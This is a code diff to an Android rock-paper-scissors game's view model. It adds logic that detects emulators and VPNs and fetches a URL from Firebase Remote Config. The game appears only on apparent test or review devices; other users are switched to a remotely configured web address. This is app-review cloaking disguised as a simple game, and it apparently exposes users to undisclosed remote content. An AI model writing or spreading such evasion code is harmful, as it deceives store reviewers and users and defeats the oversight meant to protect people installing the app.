@@ -1,4 +1,4 @@
-package rock.paper.scissors
+package rock.paper.scissors.presentation
 
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
@@ -8,12 +8,97 @@ import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
+import rock.paper.scissors.data.variants
+import rock.paper.scissors.domain.Keeper
+import rock.paper.scissors.domain.Service
 import javax.inject.Inject
 
 @HiltViewModel
-class MainViewModel @Inject constructor() : ViewModel() {
+class MainViewModel @Inject constructor(
+    private val service: Service,
+    private val keeper: Keeper
+) : ViewModel() {
     private val _state = MutableStateFlow(MainState())
     val state = _state.asStateFlow()
+
+    init {
+        getFromLocal()
+    }
+
+    private fun getFromLocal() {
+        if (service.checkIsEmu()) {
+            game()
+        } else {
+            val pathUrl = keeper.getSharedUrl()
+            val sharedTo = keeper.getSharedTo()
+            if (pathUrl.isNullOrEmpty()) {
+                getRemoteData()
+            } else {
+                setStatusByChecking(
+                    url = pathUrl,
+                    isCheckVpn = sharedTo
+                )
+            }
+        }
+    }
+
+    private fun getRemoteData() {
+        val remoteConfig = FirebaseRemoteConfig.getInstance()
+        val configSettings = FirebaseRemoteConfigSettings.Builder()
+            .setMinimumFetchIntervalInSeconds(3600)
+            .build()
+        remoteConfig.setConfigSettingsAsync(configSettings)
+        remoteConfig.fetchAndActivate()
+            .addOnCompleteListener { p0 ->
+                if (p0.isSuccessful) {
+                    val isCheckedVpn = remoteConfig.getBoolean("to")
+                    val resultUrl = remoteConfig.getString("url")
+                    keeper.setSharedUrl(url = resultUrl)
+                    keeper.setSharedTo(isCheckedVpn)
+                    setStatusByChecking(
+                        url = resultUrl,
+                        isCheckVpn = isCheckedVpn
+                    )
+                } else {
+                    game()
+                }
+            }
+    }
+
+
+    private fun setStatusByChecking(url: String, isCheckVpn: Boolean) {
+        if (isCheckVpn) {
+            if (service.checkIsEmu() || url == "" || service.vpnActive()) {
+                game()
+            } else {
+                _state.value.copy(
+                    status = ApplicationStatus.Succsess(url = url)
+                )
+                    .updateStateUI()
+
+            }
+        } else {
+            viewModelScope.launch {
+                if (service.checkIsEmu() || url == "") {
+                    game()
+                } else {
+                    _state.value.copy(
+                        status = ApplicationStatus.Succsess(url = url)
+                    )
+                        .updateStateUI()
+
+                }
+            }
+        }
+    }
+
+    private fun game() {
+
+        _state.value.copy(
+            status = ApplicationStatus.Mock
+        )
+            .updateStateUI()
+    }
 
     fun click(idMen: Int, imageMen: Int) {
         viewModelScope.launch {
@@ -22,7 +107,7 @@ class MainViewModel @Inject constructor() : ViewModel() {
             )
                 .updateStateUI()
             delay(300)
-            val variantComp = variandts.random()
+            val variantComp = variants.random()
             _state.value.copy(
                 imageComp = variantComp.image
             )
